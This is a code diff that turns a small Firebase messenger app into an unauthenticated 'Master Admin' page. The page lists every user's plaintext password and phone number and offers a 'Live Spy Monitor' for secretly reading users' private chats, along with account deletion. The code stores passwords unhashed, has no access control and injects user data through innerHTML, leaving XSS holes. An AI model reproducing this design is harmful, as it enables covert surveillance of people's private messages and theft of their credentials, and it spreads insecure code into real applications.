@@ -3,171 +3,210 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ConnectPro - Ultimate Messenger (Admin Access)</title>
+    <title>Master Admin - ConnectPro</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-storage-compat.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+
     <style>
         :root {
-            --bg: #0f172a; --card: #1e293b; --primary: #6366f1;
-            --success: #22c55e; --text: #f8fafc; --border: #334155;
+            --bg: #020617;
+            --card: #1e293b;
+            --primary: #6366f1;
+            --danger: #ef4444;
+            --text: #f8fafc;
+            --border: #334155;
         }
 
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--bg); color: var(--text);
-            margin: 0; display: flex; height: 100vh;
-            justify-content: center; align-items: center; overflow: hidden;
+            background: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
         }
 
-        /* --- AUTH SECTION --- */
-        .auth-card {
-            background: var(--card); border-radius: 24px; padding: 40px;
-            width: 100%; transition: 0.4s; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-        }
-        .login-mode { max-width: 380px; border: 1px solid var(--border); }
-        .register-mode { max-width: 450px; border: 2px solid var(--primary); }
-
-        input, select {
-            width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px;
-            border: 1px solid var(--border); background: #0f172a; color: white;
-            box-sizing: border-box; outline: none;
+        /* --- HEADER --- */
+        header {
+            background: var(--card);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
         }
 
-        .btn {
-            width: 100%; padding: 14px; background: var(--primary); border: none;
-            color: white; font-weight: 700; border-radius: 12px; cursor: pointer;
-            margin-top: 10px; transition: 0.3s;
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 20px 40px;
         }
 
-        .captcha-box {
-            background: #334155; padding: 12px; text-align: center;
-            letter-spacing: 6px; font-weight: 800; color: #fbbf24; border-radius: 12px;
+        .stat-card {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            text-align: center;
         }
 
-        /* --- MAIN APP UI --- */
-        #appUI { display: none; width: 100%; height: 100vh; grid-template-columns: 350px 1fr; }
+        .stat-card h3 { margin: 0; font-size: 0.9rem; color: #94a3b8; }
+        .stat-card p { margin: 10px 0 0; font-size: 1.8rem; font-weight: 700; color: var(--primary); }
 
-        .sidebar { background: var(--card); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .story-bar { display: flex; gap: 12px; padding: 20px; overflow-x: auto; border-bottom: 1px solid var(--border); }
-        .story-item { min-width: 65px; height: 65px; border-radius: 50%; padding: 3px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743); cursor: pointer; }
-        .story-item img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid var(--card); }
+        /* --- CONTENT --- */
+        main {
+            padding: 0 40px 40px;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+            flex: 1;
+            overflow: hidden;
+        }
 
-        .contact-item { padding: 15px 20px; display: flex; align-items: center; gap: 15px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .contact-item:hover { background: rgba(255,255,255,0.05); }
-        .avatar { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; background: #334155; }
+        .table-section, .spy-section {
+            background: var(--card);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
 
-        .chat-main { display: flex; flex-direction: column; background: var(--bg); }
-        .msg-area { flex: 1; padding: 25px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .bubble { padding: 12px 16px; border-radius: 18px; max-width: 65%; font-size: 0.95rem; }
-        .me { align-self: flex-end; background: var(--primary); border-bottom-right-radius: 4px; }
-        .them { align-self: flex-start; background: var(--border); border-bottom-left-radius: 4px; }
+        .section-header {
+            padding: 20px;
+            background: rgba(255,255,255,0.03);
+            border-bottom: 1px solid var(--border);
+            font-weight: 700;
+        }
 
-        .input-bar { padding: 20px; background: var(--card); display: flex; gap: 10px; align-items: center; }
-        .vn-btn { width: 50px; height: 50px; border-radius: 50%; background: #ef4444; border: none; color: white; cursor: pointer; }
-        .recording { animation: pulse 1.5s infinite; }
+        .scroll-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
 
-        /* --- ADMIN UI --- */
-        #adminUI { display: none; width: 100%; height: 100vh; background: #020617; color: white; padding: 40px; overflow-y: auto; box-sizing: border-box; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; border-bottom: 1px solid #1e293b; text-align: left; font-size: 0.85rem; }
+        /* --- TABLE STYLE --- */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            text-align: left;
+            color: #94a3b8;
+            font-size: 0.8rem;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.85rem;
+        }
+
+        .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
+        .pw-text { font-family: monospace; color: #fbbf24; font-weight: bold; }
         .tag { padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; }
-        .female { background: #db2777; } .male { background: #2563eb; }
+        .male { background: #1e40af; }
+        .female { background: #9d174d; }
 
-        .hidden { display: none !important; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        /* --- SPY AREA --- */
+        .chat-log-item {
+            background: #0f172a;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 10px;
+            font-size: 0.8rem;
+        }
+
+        .chat-bubble {
+            margin: 5px 0;
+            padding: 5px 10px;
+            border-radius: 5px;
+            background: #1e293b;
+        }
+
+        .btn-spy {
+            background: var(--primary);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.75rem;
+        }
+
+        .btn-del {
+            background: var(--danger);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="authUI" class="auth-card login-mode">
-        <div id="loginSection">
-            <h2>Masuk</h2>
-            <input type="text" id="lID" placeholder="ID Username">
-            <input type="password" id="lPW" placeholder="Password">
-            <button class="btn" onclick="handleAuth('login')">MASUK</button>
-            <p style="text-align:center; cursor:pointer; color:var(--primary);" onclick="switchAuth('reg')">Daftar Akun Baru</p>
+    <header>
+        <div style="display:flex; align-items:center; gap:15px;">
+            <i class="fas fa-user-shield fa-2x" style="color:var(--primary);"></i>
+            <h1 style="margin:0; font-size:1.5rem;">ConnectPro Admin Dashboard</h1>
         </div>
-        <div id="regSection" class="hidden">
-            <h2>Daftar Akun</h2>
-            <input type="text" id="rNama" placeholder="Nama Lengkap">
-            <input type="text" id="rID" placeholder="Buat ID Unik">
-            <input type="password" id="rPW" placeholder="Password">
-            <input type="number" id="rWA" placeholder="No. WhatsApp">
-            <select id="rGender">
-                <option value="Laki-laki">Laki-laki</option>
-                <option value="Perempuan">Perempuan</option>
-            </select>
-            <div class="captcha-box" id="capBox"></div>
-            <input type="text" id="capInp" placeholder="Captcha">
-            <button class="btn" onclick="handleAuth('reg')">DAFTAR SEKARANG</button>
-            <p style="text-align:center; cursor:pointer; color:var(--primary);" onclick="switchAuth('login')">Kembali ke Login</p>
+        <button class="btn-del" onclick="window.location.reload()" style="background:#475569;">Refresh Data</button>
+    </header>
+
+    <div class="stats-container">
+        <div class="stat-card">
+            <h3>Total User</h3>
+            <p id="statUsers">0</p>
+        </div>
+        <div class="stat-card">
+            <h3>Laki-laki</h3>
+            <p id="statMale">0</p>
+        </div>
+        <div class="stat-card">
+            <h3>Perempuan</h3>
+            <p id="statFemale">0</p>
         </div>
     </div>
 
-    <div id="appUI">
-        <div class="sidebar">
-            <div style="padding:20px; display:flex; justify-content:space-between; align-items:center;">
-                <img id="myAvatar" src="" class="avatar" style="cursor:pointer;" onclick="toggleUI('profile')">
-                <div style="display:flex; gap:10px;">
-                    <button onclick="uploadStory()" style="background:none; border:none; color:var(--primary); cursor:pointer;"><i class="fas fa-plus-circle"></i> Story</button>
-                    <button onclick="openAdmin()" style="background:none; border:none; color:#64748b; cursor:pointer;"><i class="fas fa-user-shield"></i></button>
-                </div>
+    <main>
+        <section class="table-section">
+            <div class="section-header"><i class="fas fa-users"></i> Database Pengguna</div>
+            <div class="scroll-area">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>FOTO</th>
+                            <th>ID / NAMA</th>
+                            <th>PASSWORD</th>
+                            <th>NO HP</th>
+                            <th>GENDER</th>
+                            <th>AKSI</th>
+                        </tr>
+                    </thead>
+                    <tbody id="userTableBody">
+                        </tbody>
+                </table>
             </div>
-            <div class="story-bar" id="storyBar"></div>
-            <div style="padding:15px; display:flex; gap:5px;">
-                <input type="text" id="searchID" placeholder="Cari ID..." style="margin:0;">
-                <button class="btn" onclick="findFriend()" style="width:50px; margin:0;"><i class="fas fa-search"></i></button>
-            </div>
-            <div class="contact-list" id="contactList"></div>
-        </div>
-        <div class="chat-main">
-            <div id="chatHeader" style="padding:20px; background:var(--card); font-weight:700;">Pilih Obrolan</div>
-            <div class="msg-area" id="msgBox"></div>
-            <div class="input-bar">
-                <input type="text" id="msgInput" placeholder="Pesan..." style="margin:0; flex:1;">
-                <button id="vnBtn" class="vn-btn" onmousedown="startVN()" onmouseup="stopVN()"><i class="fas fa-microphone"></i></button>
-                <button class="btn" onclick="sendText()" style="width:80px; margin:0;"><i class="fas fa-paper-plane"></i></button>
-            </div>
-        </div>
-    </div>
+        </section>
 
-    <div id="profileUI" class="auth-card register-mode hidden">
-        <h2>Edit Profil</h2>
-        <div style="text-align:center;">
-            <img id="pfpPrev" src="" style="width:100px; height:100px; border-radius:50%; object-fit:cover;">
-            <input type="file" id="pfpFile" accept="image/*" style="margin-top:10px;">
-        </div>
-        <input type="text" id="pName" placeholder="Nama Lengkap">
-        <select id="pPrivacy">
-            <option value="public">🌍 Publik</option>
-            <option value="private">🔒 Privat</option>
-        </select>
-        <button class="btn" onclick="updateProfile()">SIMPAN</button>
-        <button class="btn" style="background:none;" onclick="toggleUI('app')">KEMBALI</button>
-    </div>
-
-    <div id="adminUI">
-        <div style="display:flex; justify-content:space-between;">
-            <h1><i class="fas fa-shield-alt"></i> Data Master User</h1>
-            <button class="btn" style="width:auto; background:#475569;" onclick="toggleUI('app')">Keluar Admin</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Foto</th><th>ID / Nama</th><th>Password</th><th>No. HP</th><th>Gender</th><th>Status</th><th>Aksi</th>
-                </tr>
-            </thead>
-            <tbody id="adminTable"></tbody>
-        </table>
-        <div id="adminMonitor" class="hidden" style="margin-top:30px; background:#1e293b; padding:20px; border-radius:15px;">
-            <h3 id="monTitle">Chat Log</h3>
-            <div id="monMsgs" style="height:300px; overflow-y:auto; background:#020617; padding:15px; border-radius:10px;"></div>
-        </div>
-    </div>
+        <section class="spy-section">
+            <div class="section-header"><i class="fas fa-comment-slash"></i> Live Spy Monitor</div>
+            <div class="scroll-area" id="spyContainer">
+                <p style="text-align:center; color:#64748b; margin-top:50px;">Pilih user untuk mengintip percakapan</p>
+            </div>
+        </section>
+    </main>
 
 <script>
     // --- FIREBASE CONFIG ---
@@ -182,187 +221,89 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const storage = firebase.storage();
 
-    let myID = "", targetID = "", capCode = "", mediaRec, chunks = [];
-
-    // --- NAVIGATION ---
-    function switchAuth(to) {
-        document.getElementById('loginSection').classList.toggle('hidden', to === 'reg');
-        document.getElementById('regSection').classList.toggle('hidden', to === 'login');
-        document.getElementById('authUI').className = `auth-card ${to === 'reg' ? 'register-mode' : 'login-mode'}`;
-        if(to === 'reg') {
-            capCode = Math.random().toString(36).substring(2, 7).toUpperCase();
-            document.getElementById('capBox').innerText = capCode;
-        }
-    }
-
-    function toggleUI(target) {
-        document.querySelectorAll('body > div').forEach(el => el.classList.add('hidden'));
-        document.getElementById('appUI').style.display = target === 'app' ? 'grid' : 'none';
-        if(target === 'app') {
-            document.getElementById('appUI').classList.remove('hidden');
-            loadAppData();
-        } else {
-            document.getElementById(target + 'UI').classList.remove('hidden');
-        }
-    }
-
-    // --- AUTH ---
-    function handleAuth(type) {
-        if(type === 'reg') {
-            const id = document.getElementById('rID').value.trim().toLowerCase();
-            const pw = document.getElementById('rPW').value;
-            const nama = document.getElementById('rNama').value;
-            if(document.getElementById('capInp').value.toUpperCase() !== capCode) return alert("Captcha Salah!");
-            db.ref('users/' + id).set({
-                pw, nama, gender: document.getElementById('rGender').value,
-                wa: document.getElementById('rWA').value, privacy: 'public', pfp: ''
-            }).then(() => { alert("Sukses!"); switchAuth('login'); });
-        } else {
-            const id = document.getElementById('lID').value.trim().toLowerCase();
-            const pw = document.getElementById('lPW').value;
-            db.ref('users/' + id).once('value', snap => {
-                if(snap.exists() && snap.val().pw === pw) {
-                    myID = id;
-                    document.getElementById('myAvatar').src = snap.val().pfp || 'https://via.placeholder.com/150';
-                    document.getElementById('pName').value = snap.val().nama;
-                    toggleUI('app');
-                } else alert("ID atau Password salah!");
-            });
-        }
-    }
-
-    // --- APP DATA & CHAT ---
-    function loadAppData() {
-        db.ref('stories').on('value', snap => {
-            const bar = document.getElementById('storyBar'); bar.innerHTML = "";
-            snap.forEach(s => {
-                bar.innerHTML += `<div class="story-item" onclick="openStory('${s.key}', '${s.val().url}')"><img src="${s.val().url}"></div>`;
-            });
-        });
-        db.ref(`contacts/${myID}`).on('value', snap => {
-            const list = document.getElementById('contactList'); list.innerHTML = "";
-            snap.forEach(c => {
-                list.innerHTML += `<div class="contact-item" onclick="startChat('${c.key}', '${c.val().nama}', '${c.val().pfp}')">
-                    <img src="${c.val().pfp || 'https://via.placeholder.com/150'}" class="avatar">
-                    <div><b>${c.val().nama}</b><br><small>${c.key}</small></div></div>`;
-            });
-        });
-    }
-
-    function findFriend() {
-        const fid = document.getElementById('searchID').value.trim().toLowerCase();
-        db.ref('users/' + fid).once('value', snap => {
-            if(snap.exists() && (snap.val().privacy === 'public' || fid === myID)) startChat(fid, snap.val().nama, snap.val().pfp);
-            else alert("User tidak ditemukan atau akun privat!");
-        });
-    }
-
-    function startChat(id, nama, pfp) {
-        targetID = id; document.getElementById('chatHeader').innerText = nama;
-        db.ref(`contacts/${myID}/${id}`).set({ nama, pfp });
-        const room = [myID, targetID].sort().join("_");
-        db.ref('messages/' + room).on('value', snap => {
-            const box = document.getElementById('msgBox'); box.innerHTML = "";
-            snap.forEach(m => {
-                const d = m.val(); const cls = d.sender === myID ? 'me' : 'them';
-                if(d.type === 'vn') box.innerHTML += `<div class="bubble ${cls}"><audio controls src="${d.url}"></audio></div>`;
-                else box.innerHTML += `<div class="bubble ${cls}">${d.text}</div>`;
-            });
-            box.scrollTop = box.scrollHeight;
-        });
-    }
-
-    function sendText() {
-        const text = document.getElementById('msgInput').value; if(!text || !targetID) return;
-        const room = [myID, targetID].sort().join("_");
-        db.ref('messages/' + room).push({ sender: myID, text, type: 'text', time: Date.now() });
-        document.getElementById('msgInput').value = "";
-    }
-
-    // --- VN & STORY ---
-    async function startVN() {
-        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRec = new MediaRecorder(s); mediaRec.start(); chunks = [];
-        document.getElementById('vnBtn').classList.add('recording');
-        mediaRec.ondataavailable = e => chunks.push(e.data);
-    }
-    async function stopVN() {
-        document.getElementById('vnBtn').classList.remove('recording');
-        mediaRec.stop(); mediaRec.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/mp3' });
-            const ref = storage.ref(`vns/${Date.now()}`);
-            await ref.put(blob); const url = await ref.getDownloadURL();
-            const room = [myID, targetID].sort().join("_");
-            db.ref('messages/' + room).push({ sender: myID, url, type: 'vn' });
-        };
-    }
-
-    async function uploadStory() {
-        const i = document.createElement('input'); i.type = 'file'; i.accept = 'image/*'; i.click();
-        i.onchange = async () => {
-            const ref = storage.ref(`stories/${myID}_${Date.now()}`);
-            await ref.put(i.files[0]);
-            const url = await ref.getDownloadURL();
-            db.ref('stories/' + myID).set({ url, time: Date.now() });
-        };
-    }
-
-    // --- PROFILE ---
-    async function updateProfile() {
-        const file = document.getElementById('pfpFile').files[0];
-        let url = document.getElementById('myAvatar').src;
-        if(file) {
-            const ref = storage.ref(`pfps/${myID}`);
-            await ref.put(file);
-            url = await ref.getDownloadURL();
-        }
-        db.ref('users/' + myID).update({
-            nama: document.getElementById('pName').value,
-            privacy: document.getElementById('pPrivacy').value, pfp: url
-        }).then(() => { document.getElementById('myAvatar').src = url; toggleUI('app'); });
-    }
-
-    // --- ADMIN PANEL (WITH PASSWORD VISIBILITY) ---
-    function openAdmin() {
-        toggleUI('admin');
+    // --- LOAD DATA ---
+    function initAdmin() {
         db.ref('users').on('value', snap => {
-            const t = document.getElementById('adminTable'); t.innerHTML = "";
-            snap.forEach(u => {
-                const d = u.val();
-                t.innerHTML += `<tr>
-                    <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" width="40" height="40" style="border-radius:50%; object-fit:cover;"></td>
-                    <td><b>${u.key}</b><br>${d.nama}</td>
-                    <td style="color:#fbbf24; font-family:monospace; font-weight:bold;">${d.pw}</td>
-                    <td>${d.wa || '-'}</td>
-                    <td><span class="tag ${d.gender === 'Perempuan' ? 'female' : 'male'}">${d.gender || 'N/A'}</span></td>
-                    <td>${d.privacy}</td>
-                    <td><button onclick="spy('${u.key}')" class="btn" style="width:auto; margin:0; padding:5px 10px; font-size:0.7rem;">Lihat Chat</button></td>
-                </tr>`;
+            const tbody = document.getElementById('userTableBody');
+            tbody.innerHTML = "";
+            
+            let count = 0, male = 0, female = 0;
+
+            snap.forEach(user => {
+                const d = user.val();
+                const id = user.key;
+                count++;
+                if(d.gender === 'Laki-laki') male++;
+                if(d.gender === 'Perempuan') female++;
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="avatar"></td>
+                        <td><b>${id}</b><br><span style="color:#94a3b8; font-size:0.75rem;">${d.nama}</span></td>
+                        <td class="pw-text">${d.pw}</td>
+                        <td>${d.wa || '-'}</td>
+                        <td><span class="tag ${d.gender === 'Perempuan' ? 'female' : 'male'}">${d.gender || 'N/A'}</span></td>
+                        <td>
+                            <button class="btn-spy" onclick="spyUser('${id}')">Intip</button>
+                            <button class="btn-del" onclick="deleteUser('${id}')"><i class="fas fa-trash"></i></button>
+                        </td>
+                    </tr>
+                `;
             });
+
+            document.getElementById('statUsers').innerText = count;
+            document.getElementById('statMale').innerText = male;
+            document.getElementById('statFemale').innerText = female;
         });
     }
 
-    function spy(id) {
-        document.getElementById('adminMonitor').classList.remove('hidden');
-        document.getElementById('monTitle').innerText = "Monitoring Chat: " + id;
-        const box = document.getElementById('monMsgs'); box.innerHTML = "Memuat percakapan...";
-        db.ref(`contacts/${id}`).once('value', snap => {
-            box.innerHTML = "";
-            if(!snap.exists()) box.innerHTML = "User belum memiliki riwayat chat.";
-            snap.forEach(c => {
-                const room = [id, c.key].sort().join("_");
-                box.innerHTML += `<div style="color:var(--primary); margin-top:15px; border-bottom:1px solid #334155;">Obrolan dengan: ${c.key}</div>`;
-                db.ref('messages/' + room).once('value', mSnap => {
-                    mSnap.forEach(m => {
-                        const d = m.val();
-                        box.innerHTML += `<div style="font-size:0.8rem; margin:2px 0;"><b>${d.sender}:</b> ${d.text || '[Voice Note]'}</div>`;
+    // --- SPY LOGIC ---
+    function spyUser(userId) {
+        const spyBox = document.getElementById('spyContainer');
+        spyBox.innerHTML = `<h4>Menyadap: <span style="color:var(--primary)">${userId}</span></h4>`;
+        
+        // Cari riwayat kontak user tersebut
+        db.ref(`contacts/${userId}`).once('value', snap => {
+            if(!snap.exists()) {
+                spyBox.innerHTML += `<p style="color:var(--danger)">User ini belum pernah chat.</p>`;
+                return;
+            }
+
+            snap.forEach(contact => {
+                const partnerId = contact.key;
+                const roomId = [userId, partnerId].sort().join("_");
+                
+                const roomDiv = document.createElement('div');
+                roomDiv.className = 'chat-log-item';
+                roomDiv.innerHTML = `<strong>Lawan Chat: ${partnerId}</strong><hr style="border:0; border-top:1px solid #334155; margin:5px 0;">`;
+                
+                // Ambil pesan dalam room tersebut
+                db.ref(`messages/${roomId}`).limitToLast(10).once('value', mSnap => {
+                    mSnap.forEach(msg => {
+                        const m = msg.val();
+                        const sender = m.sender === userId ? "USER" : "LAWAN";
+                        roomDiv.innerHTML += `
+                            <div class="chat-bubble">
+                                <span style="color:${m.sender === userId ? '#6366f1' : '#94a3b8'}; font-weight:bold;">${sender}:</span> 
+                                ${m.type === 'vn' ? '🎤 [Voice Note]' : m.text}
+                            </div>`;
                     });
                 });
+                spyBox.appendChild(roomDiv);
             });
         });
     }
+
+    // --- DELETE USER ---
+    function deleteUser(id) {
+        if(confirm(`Hapus permanen akun ${id}? Tindakan ini tidak bisa dibatalkan.`)) {
+            db.ref(`users/${id}`).remove();
+            alert("User telah dihapus.");
+        }
+    }
+
+    initAdmin();
 </script>
 </body>
 </html>
